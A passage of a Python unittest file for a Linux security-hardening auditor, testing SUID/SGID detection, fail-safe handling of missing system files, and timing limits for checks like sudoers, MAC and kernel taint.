            base = Path(tmp)
            self._suid_file(base, "su", 0o4757)
            with mock.patch.object(hardening, "SYSTEM_BIN_DIRS", (str(base),)):
                findings = check_suid_binaries()
        self.assertEqual(findings[0].severity, Severidad.ALTA)

    def test_normal_suid_binaries_are_only_inventoryed(self):
        # Root-owned and not writable by others: the usual case (sudo, su…).
        normal = SuidBinary("/usr/bin/sudo", 0, 0o104755, "suid")
        with mock.patch.object(hardening, "scan_suid_binaries", return_value=[normal]):
            findings = check_suid_binaries()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("1 binario(s) con SUID/SGID", findings[0].title)

    def test_no_suid_binaries_is_info(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            self._suid_file(base, "normal", 0o755)
            with mock.patch.object(hardening, "SYSTEM_BIN_DIRS", (str(base),)):
                findings = check_suid_binaries()
        self.assertEqual(findings[0].severity, Severidad.INFO)
        self.assertIn("Sin binarios SUID/SGID", findings[0].title)


class FailSafeTests(unittest.TestCase):
    """A path that does not exist must never be an exception."""

    def test_every_check_survives_missing_files(self):
        missing = Path("/no/existe/nada")
        patches = [
            mock.patch.object(hardening, "TAINTED_PATH", missing),
            mock.patch.object(hardening, "CORE_PATTERN_PATH", missing),
            mock.patch.object(hardening, "LIMITS_PATH", missing),
            mock.patch.object(hardening, "CPU_VULNERABILITIES_DIR", missing),
            mock.patch.object(hardening, "IOMMU_DIR", missing),
            mock.patch.object(hardening, "EFI_DIR", missing),
            mock.patch.object(hardening, "SUDOERS_PATH", missing),
            mock.patch.object(hardening, "SUDOERS_DIR", missing),
            mock.patch.object(hardening, "APPARMOR_PROFILES_PATH", missing),
            mock.patch.object(hardening, "APPARMOR_MODULE_DIR", missing),
            mock.patch.object(hardening, "APPARMOR_ENABLED_PATH", missing),
            mock.patch.object(hardening, "APPARMOR_DISK_DIR", missing),
            mock.patch.object(hardening, "CMDLINE_PATH", missing),
            mock.patch.object(hardening, "SELINUX_FS_DIR", missing),
            mock.patch.object(hardening, "SELINUX_ENFORCE_PATH", missing),
            mock.patch.object(hardening, "PROC_DIR", missing),
            mock.patch.object(hardening, "resolve_binary", return_value=None),
        ]
        for patch in patches:
            patch.start()
        try:
            for check in (
                check_kernel_taint,
                check_core_dumps,
                check_cpu_mitigations,
                check_iommu,
                check_secure_boot,
                check_sudoers,
                check_mac,
                check_mac_runtime,
            ):
                with self.subTest(check=check.__name__):
                    findings = check()
                    self.assertIsInstance(findings, list)
            findings = check_persistence(DISTRO)
            self.assertIsInstance(findings, list)
        finally:
            for patch in patches:
                patch.stop()


class PerformanceTests(unittest.TestCase):
    """Each check must stay well under 50 ms on the target hardware.

    The two checks that shell out (crontab, dmesg) are measured with
    the runner stubbed: the fork itself is the cost, and it is
    documented separately (AGENTS.md).
    """

    def _time(self, check) -> float:
        start = time.perf_counter()
        check()
        return (time.perf_counter() - start) * 1000

    def test_checks_are_fast(self):
        checks = [
            check_kernel_taint,
            check_core_dumps,
            check_cpu_mitigations,
            check_iommu,
            check_secure_boot,
            check_sudoers,
            check_mac,
        ]
        for check in checks:
            with self.subTest(check=check.__name__):
                self.assertLess(self._time(check), 50)

    def test_mac_runtime_scan_is_measured_and_bounded(self):
        # Una lectura por PID visible (~250 en esta máquina): ~84 ms medido.
        # Es el mismo tipo de coste que el escaneo SUID (I/O, sin fork).
        with mock.patch.object(hardening, "SELINUX_FS_DIR", Path("/no/existe")):
            mejor = min(self._time(check_mac_runtime) for _ in range(3))
        self.assertLess(mejor, 1000)

    def test_persistence_is_fast_without_subprocesses(self):
        with mock.patch.object(hardening, "resolve_binary", return_value=None):
            self.assertLess(self._time(lambda: check_persistence(DISTRO)), 50)

    def test_suid_scan_is_measured_and_bounded(self):
        # Un stat por binario del sistema: ~75-300 ms en el hardware
        # objetivo (Celeron N3050 + HDD; el disco mete ruido y la carga de
        # la máquina lo sube más). Es el segundo chequeo más caro, después
        # de dmesg: está medido y acotado, no escondido.
        #
        # Se mide la MÍNIMA de tres vueltas: la mínima es la estimación
        # menos ruidosa (con la caché del disco caliente) y evita que un
        # momento de carga del equipo haga fallar el test. El margen
        # (1,5 s) sigue cazando una regresión de 10x.
        tiempos = []
        for _ in range(3):
            inicio = time.perf_counter()
            scan_suid_binaries()
            tiempos.append((time.perf_counter() - inicio) * 1000)
        mejor = min(tiempos)
        self.assertLess(mejor, 1500)


if __name__ == "__main__":
    unittest.main()
